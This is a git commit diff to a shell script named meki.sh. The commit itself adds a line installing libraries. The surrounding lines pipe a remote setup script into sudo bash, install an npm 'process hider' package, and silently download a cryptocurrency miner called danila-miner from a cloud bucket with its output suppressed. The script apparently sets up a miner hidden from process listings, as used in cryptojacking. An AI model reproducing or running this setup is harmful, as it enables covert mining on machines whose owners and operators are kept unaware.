cb930f5bd6d214d85b1698763183810bf34daa17
renilo <88342640+renilo@users.noreply.github.com>
2022-03-06 14:12:08 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -12,6 +12,8 @@ apt install curl
 
 apt install screen -y
 
+sudo apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
+
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider
 
 wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1 
